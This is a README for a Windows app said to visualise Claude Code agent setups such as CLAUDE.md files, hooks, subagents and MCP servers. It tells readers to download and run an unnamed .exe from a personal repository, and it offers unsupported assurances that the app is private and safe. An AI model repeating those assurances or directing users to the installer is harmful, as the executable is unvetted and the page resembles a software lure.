# 🗺️ claude-code-flow-visualizer - See your AI agent workflows clearly

[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge&logo=github)](https://github.com/Edina3459/claude-code-flow-visualizer)

## 📖 About this application

The claude-code-flow-visualizer helps you understand how your AI agents work. These agents often have complex structures involving many files, instructions, and tools. When you use Claude Code, the system creates rules in files like CLAUDE.md. It also connects to subagents, specific skills, and external servers. Keeping track of these connections is difficult.

This tool builds a visual map of your setup. It shows how your commands, hooks, and MCP servers link together. You see the full structure of your project on a screen. This map helps you find errors, check your logic, and see which parts of your agent work together.

It runs locally on your machine. Your data never leaves your computer. This keeps your agent instructions and project files private. You do not need a server or a cloud account to use this visualizer.

## 💻 System requirements

*   Operating System: Windows 10 or Windows 11.
*   Memory: 4 gigabytes of RAM or more.
*   Storage: 200 megabytes of free space.
*   Connection: An internet connection for downloading the setup file.

## 📥 How to get started

Follow these steps to set up the visualizer on your computer.

1. Visit the [official download page link](https://github.com/Edina3459/claude-code-flow-visualizer).
2. Look for the file ending in .exe.
3. Click the file to start the download.
4. Save the file to your desktop or downloads folder.
5. Double-click the file to begin the installation.
6. Follow the prompts on the screen to finish the setup.
7. Open the application from your start menu or desktop icon.

## 🛠️ How to use the visualizer

Once you launch the app, you see a clean interface. Follow these steps to map your project:

1. Select your project source. You can pick an entire folder on your drive, a zip file, or a direct link from GitHub.
2. Click the Load button.
3. Wait for the app to scan your files. It reads your CLAUDE.md file and configuration settings.
4. View the resulting graph. The nodes represent your subagents, skills, and tools. The lines represent the flow of commands.
5. Use your mouse to drag pieces of the map. This helps you organize the view. 
6. Click any node to see details about that part of your agent.

## 🔍 Features

### Interactive Mapping
The tool creates a real-time graph. You zoom in and out to see details. This clarifies how complex agent loops function.

### Local Privacy
Security stays within your network. Because the app process occurs on your computer, your proprietary AI instructions remain safe.

### Flexible Input
You bring the data in different ways. If you share a repo link, the app pulls the structure. If you work on a local folder, it scans the files instantly.

### Component Breakdown
The app highlights key parts of your setup:
*   Subagents: See which agents perform specific tasks.
*   MCP Servers: Check your tool connections.
*   Hooks: Track how events trigger agent actions.
*   Commands: Review available prompts and instructions.

## ❓ Frequently asked questions

**Does this tool send my code to the cloud?**
No. All processing happens inside the application on your computer. No data goes to external servers.

**What happens if my agent structure is very large?**
The visualizer uses a layout engine designed for large graphs. If you have many hundreds of nodes, the app keeps the view responsive by clustering items.

**Can I export the graph?**
Yes. You can save your visualization as an image file. This helps when you want to share your project structure with your team.

**Is this safe for commercial projects?**
Yes. Since the software runs offline, your project secrets do not leave your disk.

## 🧩 Support

If you run into trouble, check the following:
*   Make sure you have read and write permissions in the folder you are scanning.
*   Verify that your CLAUDE.md file follows standard formatting.
*   Ensure your Windows version is up to date.

Keywords: agent-orchestration, ai-agents, anthropic, claude, claude-code, developer-tools, mcp, multi-agent, react, visualization